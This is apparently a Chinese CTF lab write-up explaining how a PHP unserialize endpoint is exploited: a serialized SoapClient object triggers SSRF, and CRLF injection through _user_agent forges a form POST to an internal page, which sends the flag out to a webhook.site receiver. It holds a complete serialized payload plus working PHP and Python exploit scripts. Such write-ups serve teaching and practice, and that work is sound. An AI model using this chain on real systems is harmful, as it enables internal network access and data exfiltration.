# unserialize-lab · un9（SoapClient SSRF + CRLF 注入）

> 靶场：`http://120.76.159.54:8888/un9.php`
> 环境：Apache/2.4.10 (Debian) + **PHP/5.5.38**
> 结果：`flag{50@p_15_44nny_d0_yo4_know}`
> 版本：**重写版**（2026-10-01）——不再按"我当时试了什么"记流水账，改成按**每一步为什么**排。踩过的坑单独成节。

---

## 〇、一句话主线

> `SoapClient::__call` 的本来职责就是**发 HTTP 请求** → 借它做 SSRF 打内网 `un92` → 但 `un92` 只认 **POST 表单** → 用 `_user_agent` 做 **CRLF 注入**抢在 `Content-Type` 前面 → 塞进 `py=flag&url=你的地址` → flag 回调给你。

---

## 一、题目

### un9.php

```php
<?php
// POST py=flag&url=yoururl to un92.php and you will get the flag
if (isset($_GET['tryhackme']) && is_string($_GET['tryhackme'])){
    $a = unserialize($_GET['tryhackme']);
    $a->pyflag();
} else {
    show_source(__FILE__);
}
?>
```

### un92.php（内网）

```
从公网访问 → 拒绝（要求 REMOTE_ADDR = 127.0.0.1）
从本地访问 → 返回内容
提示：POST py=flag&url=yoururl → 它把 flag 发到 yoururl
```

**→ 需要一个"能读到内容"的外部接收端**（本 WP 用 webhook.site）。

---

## 二、考点判断

| 看到 | 推出 |
|---|---|
| 有 `unserialize($_GET['tryhackme'])` | 反序列化入口 |
| **源码里没有任何 `class`** | 只能用 **PHP 内置类** |
| 调了**不存在的方法** `pyflag()` | 需要内置类带 `__call` → **只有 `SoapClient`** |
| un92 只允许 `REMOTE_ADDR=127.0.0.1` | 必须**服务器自己**发请求 → **SSRF** |

---

## 三、原理：四个必须想通的问题

### 3.1 为什么 `$a->pyflag()` 会发 HTTP 请求

```php
new SoapClient(null, array('location' => '...', 'uri' => 'x'));
//   ↑ null = 非 WSDL 模式 → 任何方法都能调 → 全部走 __call
//     __call 内部：拼 SOAP XML，POST 到 location
```

方法不存在 → 触发 `__call` → 而 `SoapClient::__call` 的职责**本来就是发请求**。这就是它能被滥用成 SSRF 的原因。

### 3.2 为什么必须 SSRF，不能伪造请求头

`REMOTE_ADDR` 是 **TCP 连接的源地址**，由内核填写。`X-Forwarded-For` / `X-Real-IP` / `X-Client-IP` **实测全部无效**。

→ 只能让服务器自己发请求，源地址天然是 `127.0.0.1`。

### 3.3 为什么注入点只能是 `_user_agent`

PHP 5.x 的 SOAP 客户端拼请求时，**头的顺序是固定的**：

```http
POST /un92.php HTTP/1.1
Host: 127.0.0.1
Connection: Keep-Alive
User-Agent: ←────────── 来自 _user_agent      ⭐ 在 Content-Type 之前
Content-Type: text/xml; charset=utf-8
SOAPAction: ←────────── 来自 uri             ❌ 在 Content-Type 之后
... (Cookie 之类，若有)
Content-Length: ←────── PHP 最后才算、最后才写
                            ← 空行
<?xml ...>                  ← PHP 自己的 body
```

**HTTP 头"首值优先"**（RFC 7230 §3.2.2）：同一个头出现多次、而该头不允许列表（`Content-Type`、`Content-Length` 都是），接收方**只取第一个**，后面的静默丢弃。

所以要覆盖 `Content-Type`，**你的注入必须排在它前面**：

| 注入点 | 变成 | 位置 | 能否抢到 Content-Type |
|---|---|---|---|
| `location` | 请求行 | 最顶 | ❌ 塞 CRLF 直接 400 |
| **`_user_agent`** | `User-Agent` | Content-Type **之前** | ✅ **唯一可用** |
| `uri` | `SOAPAction` | Content-Type **之后** | ❌ 排后面，写得再对也没用 |

> 当初先试 `uri` 白忙一场，**不是 payload 写错，是位置天生不对**。

### 3.4 为什么要抢 `Content-Type`

**PHP 填不填 `$_POST`，取决于请求的 `Content-Type`**：

| Content-Type | PHP 的行为 |
|---|---|
| `application/x-www-form-urlencoded` | 解析 body → **填 `$_POST`** ✅ |
| `multipart/form-data` | 解析 → `$_POST` + `$_FILES` |
| `text/xml`（SoapClient 默认） | **完全不解析**，`$_POST` 是空数组 ❌ |

un92 的逻辑是"`$_POST['py']=='flag'` 就把 flag 发到 `$_POST['url']`"。Content-Type 不换，**body 塞得再对也是白塞**。

**所以这题真正的难点不是"能不能塞 body"，而是"能不能让 un92 把 body 当表单读"。**

### 3.5 为什么 `User-Agent` 填 `a` 就行

利用的是**这个位置**，不是**它的内容**。PHP 写出去的形式是：

```
User-Agent: <你的值>\r\n
```

值以 `\r\n` 开头结尾都无所谓，只要**中间那个 `\r\n` 能把这一行封口**，后面的内容就被当成新头解析。`a` 只是让这行看起来正常。

**就算对方校验 UA 也不是障碍**——把标准 UA 放在 `\r\n` **前面**即可：

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n
Content-Type: application/x-www-form-urlencoded\r\n
...
```

---

## 四、解法：4 级验证阶梯

**核心设计：一条模板从头用到尾，只改两个变量。**（SSRF 是盲打，必须每一步都有验证点）

```python
import requests
t = "http://127.0.0.1/un92.php"          # 这次请求发给谁（阶段 2/3 改成 h）
h = "https://webhook.site/你的token"      # 接收端
b = f"py=flag&url={h}"                   # 要 POST 给 un92 的表单
u = "a"                                  # 注入到 User-Agent 的内容 ← 每阶段只改这里
p = (f'O:10:"SoapClient":3:{{s:11:"_user_agent";s:{len(u)}:"{u}";'
     f's:8:"location";s:{len(t)}:"{t}";s:3:"uri";s:1:"x";}}')
r = requests.get("http://120.76.159.54:8888/un9.php", params={"tryhackme": p})
print(r.status_code, len(r.text), r.text[:200])
```

| 阶段 | `u`（注入内容） | `t`（发给谁） | 用 `b` | **成功信号** |
|---|---|---|---|---|
| **1** | `"a"` | un92 | ✗ | 返回 `looks like we got no XML document` |
| **2** | `"MYUA\r\nX-Test: HELLO"` | `h`（webhook） | ✗ | webhook 里出现 `x-test: HELLO` |
| **3** | 完整注入串（含 `b`） | `h`（webhook） | ✓ | webhook 里 `content` = `py=flag&url=...` |
| **4** | 同阶段 3 | un92 | ✓ | webhook 里 `?flag=flag{...}` 🚩 |

**看穿这个表**：`t` 只在"自己看（webhook）"和"真打（un92）"之间切；`u` 从空 → 试探 → 完整逐步长大。

阶段 2/3 的意义：**先用 webhook 证明"注入生效"，再去打真目标**。不然你根本不知道是注入没生效，还是 un92 不认。

---

## 五、最终 payload 与完整代码

### 5.1 payload（PHP 5.x 格式，实际是一行）

```
O:10:"SoapClient":4:{s:3:"uri";s:1:"x";s:8:"location";s:25:"http://127.0.0.1/un92.php";s:11:"_user_agent";s:183:"a\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 108\r\n\r\npy=flag&url=https://webhook.site/xxxx";s:13:"_soap_version";i:1;}
```

（`\r\n` 是**真实回车换行字节**）

### 5.2 生成端：un9成品1.php

```php
<?php
$t = 'http://127.0.0.1/un92.php';
$h = 'https://webhook.site/你的token';
$b = 'py=flag&url=' . $h;

$u = "a\r\n"
   . "Content-Type: application/x-www-form-urlencoded\r\n"
   . "Content-Length: " . strlen($b) . "\r\n"     // 只数 body
   . "\r\n"                                        // 空行 = 头结束
   . $b;

$c = new SoapClient(null, array(
    'location'   => $t,
    'uri'        => 'x',
    'user_agent' => $u        // ⚠️ 构造参数不带下划线，序列化后才是 _user_agent
));

echo serialize($c) . "\n";
file_put_contents(__DIR__ . '/p.txt', urlencode(serialize($c)));   // ⚠️ 不要写中文路径
echo "OK -> p.txt\n";
```

### 5.3 发送端：un9成品2.py

```python
import requests

p = open(r"C:\Users\暗炎魔主\Desktop\p.txt", encoding="utf-8").read().strip()
url = "http://120.76.159.54:8888/un9.php?tryhackme=" + p     # ⚠️ 不能走 params=
r = requests.get(url)
print("status:", r.status_code)
print("len   :", len(r.text))
print(r.text[:300])
```

### 5.4 运行

```powershell
D:\phpstudy\phpstudy_pro\Extensions\php\php5.4.45nts\php.exe "C:\Users\暗炎魔主\Desktop\un9成品1.php"
python "C:\Users\暗炎魔主\Desktop\un9成品2.py"
```

### 5.5 ⚠️ 一条必须配套记住的关系

> **PHP 负责 `urlencode`，Python 就不要再编码。**

`p.txt` 里的 payload 已经是 `%XX` 形式，必须**直接拼在 URL 后面**。写成 `params={"tryhackme": p}` 会被**二次编码**（`%3A` → `%253A`），靶机解出来是一堆 `%` 号，`unserialize` 直接失败。

**为什么要 urlencode**：把 `\r\n` 变成 `%0D%0A`，整个 payload 就成了**一行纯 ASCII**——可以随意复制、存文件、塞进 URL，不会因为真换行被截断。

---

## 六、序列化格式速查

```
O : 10 : "SoapClient" : 4 : {                     ← 对象头
    s : 3  : "uri"         ; s : 1   : "x" ;      ← 属性：名 + 值
    s : 8  : "location"    ; s : 25  : "..." ;
    s : 11 : "_user_agent" ; s : 183 : "..." ;
    s : 13 : "_soap_version"; i : 1   ;           ← i = 整数
}                                                 ← 收尾
```

| 规则 | 写法 |
|---|---|
| 对象 | `O:类名长度:"类名":属性个数:{属性们}` |
| 字符串 | `s:长度:"内容"` |
| 整数 | `i:数字` |
| 多个属性 | **直接连写**，无逗号无空格 |
| 每段后面 | 都要分号 `;` |

**本题固定数字**：

| 片段 | 长度 |
|---|---|
| `SoapClient` | 10 |
| `_user_agent` | **11**（两个下划线都算） |
| `location` | 8 |
| `uri` | 3 |
| `_soap_version` | 13 |

**只有 `u` 和 `t` 的长度是变的，用 `len()` 让代码算，别手数。**

### 6.1 两个长度别搞混

| 数字 | 是什么 | 从哪算到哪 |
|---|---|---|
| `s:183:` | **整个注入值**的字节数 | 从 `a` 开始到 body 结束 |
| `Content-Length: 108` | **只有 body** 的字节数 | 从 `py` 开始到结尾 |

公式：`Content-Length = len("py=flag&url=") + len(接收地址) = 12 + len(h)`

⚠️ `len()` 对 str 算的是**字符数**，PHP 要的是**字节数**。全 ASCII 时相等；有中文必须 `len(v.encode())`。

### 6.2 属性顺序无所谓

`unserialize` 按**名字**找属性，不按位置。`uri` 在前在后、`_soap_version` 在头在尾，都能用。PHP 自己生成的顺序（`uri → location → _user_agent → _soap_version`）和手写的顺序不一样，两者都验证通过。

---

## 七、PHP 版本差异（硬坑）

| | 构造参数 | 序列化出来的属性名 | 属性个数 |
|---|---|---|---|
| **PHP 5.x**（本题靶机 5.5） | `user_agent` | **`_user_agent`**（11） | 3~4 个**公开**属性 |
| PHP 8.x | `user_agent` | `user_agent`（10） | **36 个私有**属性 |

**实测对照**（同一份 PHP 源码，只换解释器）：

```
PHP 5.4.45 → O:10:"SoapClient":4:{s:3:"uri";s:1:"x";s:8:"location";...;s:11:"_user_agent";s:183:"...";s:13:"_soap_version";i:1;}
             长度 326，4 个公开属性                        ✅ 靶机能用

PHP 8.2.9  → O:10:"SoapClient":36:{s:15:"<NUL>SoapClient<NUL>uri";s:1:"x";s:17:"<NUL>SoapClient<NUL>style";N;...}
             长度 1461，36 个私有属性，属性名带 NUL 字节前缀  ❌ 靶机不认
```

**结论**：

> **生成 payload 必须用"和靶机同大版本"的 PHP。** 网上文章几乎都是 PHP 7.x，照抄到 PHP 5.x 靶机 = 静默失效。

**本地确认属性名的办法**：

```powershell
php -r "$c=new SoapClient(null,['location'=>'http://x/','uri'=>'y','user_agent'=>'UA']);echo serialize($c);"
```

---

## 八、中文 Windows + PHP 的路径坑（环境坑，但很致命）

### 现象

```php
file_put_contents('C:\Users\暗炎魔主\Desktop\out.txt', $p);
// Warning: file_put_contents(C:\Users\鏆楃値榄斾富\Desktop\out.txt): failed to open stream:
//          No such file or directory
```

### 因果链

```
① 编辑器把源码存成 UTF-8 → '暗炎魔主' 的字节是 E6 9A 97 E7 82 8E E9 AD 94 E4 B8 BB
② PHP 把字符串当"一串字节"，一个字节都不转换
③ Windows 的文件 API 按"系统代码页 = GBK/936"理解这串字节
      E6 9A 97 E7 82 8E E9 AD 94 E4 B8 BB  →  鏆楃値榄斾富   （6 个合法 GBK 汉字）
      '版' = E7 89 88 → E7 89 = 鐗，剩下的 88 映射不出来 → 变成 ?
④ 文件名含 '?' → Windows 禁止（? 是通配符）→ CreateFile 失败
```

### 实测：四种写法

| 写法 | 结果 |
|---|---|
| `'C:\Users\暗炎魔主\...\x.txt'`（**中文目录 + 英文文件名**） | ❌ **false** |
| `'C:\Users\Public\x.txt'`（全 ASCII 绝对路径） | ✅ |
| `'x.txt'`（相对路径，落在 cwd） | ✅ |
| **`__DIR__ . '/x.txt'`** | ✅ **推荐** |
| `'测试.txt'`（中文字面量） | ⚠️ 返回成功，但**文件名变成 `娴嬭瘯.txt`** |

**注意第一行**：文件名改成纯英文**照样失败**——因为**目录**里的 `暗炎魔主` 已经坏了。

### 为什么脚本本身能打开（路径里也有中文）？

| | 路径从哪来 | 字节对不对 |
|---|---|---|
| **脚本路径** | PowerShell → Windows 用 UTF-16 传命令行，PHP 拿到时**已过正规宽字符转换** | ✅ |
| **源码里的字符串** | 编辑器存的 **UTF-8 字节**，PHP 原样转交 Windows | ❌ 被当 GBK |

### 解法

```php
file_put_contents(__DIR__ . '/p.txt', ...);   // __DIR__ = 脚本所在目录
```

`__DIR__` 是 PHP 从"它刚刚成功打开的脚本路径"里取的，**字节天然正确**，不经过你写的字面量。

> **规律**：中文 Windows + PHP + 路径/文件名 → **绝不在源码里写中文路径**。
> **Python 没这个问题**（Python 3 在 Windows 走 Unicode API），`open(r"C:\Users\暗炎魔主\...")` 完全没问题。

---

## 九、报错对照表（按"卡在哪一层"排）

看报错先分层，能省一半时间：

| 层 | 报错 | 含义 | 去查什么 |
|---|---|---|---|
| **反序列化层** | `Call to a member function pyflag() on a non-object` | `unserialize()` 返回了 `false`，**payload 没变成对象** | 长度、属性个数、URL 编码（是否被二次编码/被 CRLF 截断） |
| **SOAP 层** | `looks like we got no XML document` | **请求成功发出去了**，只是响应不是 XML | 正常现象，继续 |
| | `Error finding "uri" property` | 缺 `uri` | 补 `s:3:"uri";s:1:"x";` |
| | `Error could not find "location" property` | 缺 `location` | 补上 |
| **HTTP 层** | `[HTTP] Bad request` (400) | `location` 里塞了 CRLF | 只能从 `_user_agent`/`uri` 注入 |
| | `[HTTP] Not Found` | 路径写错 | 检查 `location` |
| | `[HTTP] Could not connect to host` | 端口不通 | 换端口 |
| | `Unknown protocol. Only http and https are allowed` | 协议被禁 | 只支持 http/https |
| **成功** | **响应 0 字节（完全静默）** | ✅ **攻击成功** | 去 webhook 看 flag |

---

## 十、⭐ "响应为空"反而是成功信号（实测 5 组对照）

这题最反直觉的一点。同一靶机、同一注入，只改 body：

| 案例 | 内容 | 响应长度 | 说明 |
|---|---|---|---|
| A | 不注入，location=un92 | 336 | 报 `no XML document` |
| **B** | 注入 `py=flag&url=...`，location=un92 | **0** | **静默** |
| B' | 注入 `py=no&url=...`，location=un92 | 336 | 没进发 flag 分支 |
| B'' | 注入空 body，location=un92 | 336 | 同上 |
| C | 注入 `py=flag&url=...`，location=**webhook** | 336 | 外站返回 HTML，照常报错 |

**推理**：

1. **C 证明**注入本身不会吞报错（同样注入，只换目标，错误照常出现）
2. **B'/B'' 证明**"多余字节形成的第二个畸形请求"也不会吞报错（注入结构与 B 完全相同）
3. **唯一变量**是 `py=flag` **触发了 un92 的发 flag 分支**

**结论**：un92 成功发完 flag 后**直接结束，返回 0 字节**；PHP 的 SOAP 客户端对**空响应不抛异常** → `__call` 正常返回 → un9.php 无任何输出 → `200 + 0 字节`。

> **记忆点**：这题里"没反应"才是好消息。真正的失败会有报错。

---

## 十一、踩坑记录

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| **属性名写成 `user_agent`** | UA 一点没变，注入**静默无效、零报错** | PHP 5.x 内部属性名是 `_user_agent` | 用 `_user_agent` |
| **先试 `uri` 注入** | body 进去了，但 `Content-Type` 还是 `text/xml` | `SOAPAction` 排在 Content-Type **之后**，首值优先覆盖不了 | 改用 `_user_agent` |
| **用 PHP 8.2 生成** | `O:10:"SoapClient":36:{s:15:"\0SoapClient\0uri";...}` | PHP 8 的属性是 private | 用 PHP 5.4 生成 |
| **PHP 里写中文路径** | `failed to open stream`，报错路径是 `鏆楃値榄斾富` | UTF-8 字面量被按 GBK 解读 | `__DIR__` / 相对路径 / ASCII 路径 |
| **`input()` 接 payload** | 只发出去半截 | 输出里的 `\r\n` 是**真换行**，第一个换行就提交了 | 写文件再读（`p.txt`） |
| **`params={"tryhackme": p}`** | `on a non-object` | payload 已编码，`params` 又编码一次 | 直接拼 URL 字符串 |
| **原始 payload 直接拼 URL** | `on a non-object` | URL 里的裸 CRLF 把请求行截断了 | 先用 `urlencode` |
| **curl 直接发 URL** | 响应里 `"` `{}` 全消失 | curl 的 `{}` URL globbing | 整体 URL 编码，或 `curl -g` |
| **参数写在 query 里** | un92 不响应 | un92 只认 **`$_POST`** | 必须注入 body |
| **`location` 里塞 CRLF** | `400 Bad Request` | 破坏了请求行 | 只能从 `_user_agent`/`uri` 注入 |
| **webhook 地址抄成网页地址** | 地址栏是 `.../#!/view/<token>/<请求id>/1` | `#` 后面的内容浏览器不发给服务器 | 地址**到 token 为止**（实测子路径也会被记录，但别依赖） |
| **PowerShell 改 .py 文件** | 中文乱码 → SyntaxError | 编码问题 | 用 VS Code / 记事本，存 UTF-8 |

---

## 十二、知识点总结

| # | 知识点 |
|---|---|
| 1 | **没有自定义类时用 PHP 内置类**：`SoapClient`（`__call`→SSRF）、`Error`/`Exception`（`__toString`→XSS）、`SimpleXMLElement`（XXE）、`SplFileObject`（读文件）、`DirectoryIterator`（列目录） |
| 2 | **非 WSDL 模式** `new SoapClient(null, [...])` → 任何方法都能调 → 全走 `__call` |
| 3 | **`SoapClient::__call` 的正常职责就是发 HTTP 请求** → 被滥用成 SSRF |
| 4 | **`REMOTE_ADDR` 是 TCP 层，HTTP 头伪造不了** → 必须 SSRF |
| 5 | **写头顺序决定可用注入点**：`_user_agent` 在 `Content-Type` 前 → 可选；`uri` 在后 → 不可选 |
| 6 | **HTTP 头首值优先**：想覆盖别人，必须排在它前面（不是后面） |
| 7 | **CRLF 注入**：`\r\n` 能封口当前头、插入新头、用空行结束头块、再塞 body |
| 8 | **`$_POST` 填不填由 `Content-Type` 决定** → 抢 Content-Type 才是这题的核心 |
| 9 | **PHP 版本差异**：`_user_agent`(5.x) vs `user_agent`(7.x+)；序列化 5.x public vs 8.x private |
| 10 | **PHP 最后才写 `Content-Length`** → 残余字节会变成"第二个畸形请求"（请求走私的原理）；本解法靠它不捣乱（我们的 Content-Length 卡住了读取边界） |
| 11 | **两个长度**：`s:len` 是整个属性值，`Content-Length` 只是 body |
| 12 | **属性顺序无所谓**，`unserialize` 按名字找 |
| 13 | **`urlencode` 后绝不能再编码**（`params=` / `quote` 二次编码会毁掉 payload） |
| 14 | **中文 Windows + PHP 字面量路径会因 GBK 曲解失效**，用 `__DIR__`；Python 无此问题 |
| 15 | **盲打类漏洞必须分级验证**：先证明 SSRF 通，再证明注入生效，最后才打真目标 |

---

## 十三、迁移：同类题怎么打

```
① 读源码
   ├─ 有没有自定义类？
   │   ├─ 没有 → 找内置类：
   │   │        调不存在的方法   → SoapClient（__call → SSRF）
   │   │        对象当字符串用   → Error / Exception（__toString）
   │   │        动态 new / 解析  → SimpleXMLElement（XXE）、SplFileObject（读文件）
   │   └─ 有  → 从终点逆推，构造 POP 链
   │
② 写最小 payload，先确认"能触发"（看报错层次）
   │
③ 找"会被写进 HTTP 头"的属性，对照写头顺序挑注入点
   │  SoapClient：_user_agent（在前，可用）、uri（在后，不可用）
   │
④ 用 CRLF 注入需要的头 + 空行 + body
   │  别忘了 Content-Length 要自己写（外层库不会替你算嵌套请求的长度）
   │
⑤ 每一步都用 webhook.site 验证（SSRF 是盲的，不看接收端等于闭眼开车）
```

---

## 十四、一句话总结

> **un9 = 用内置类 `SoapClient` 的 `__call` 做 SSRF，再用 `_user_agent` 属性做 CRLF 注入，抢在 `Content-Type` 前面把它改成表单类型并塞入 `py=flag&url=你的地址`，让 un92 以 `127.0.0.1` 的身份收到表单，把 flag 回调给你。**
>
> **核心一句**：`User-Agent` 排在 `Content-Type` 前面，而 HTTP 头**首值优先** —— 所以从 `_user_agent` 注入才能"抢到" Content-Type。
>
> **反直觉一句**：这题**响应为空才是成功**，有报错说明还没打通。
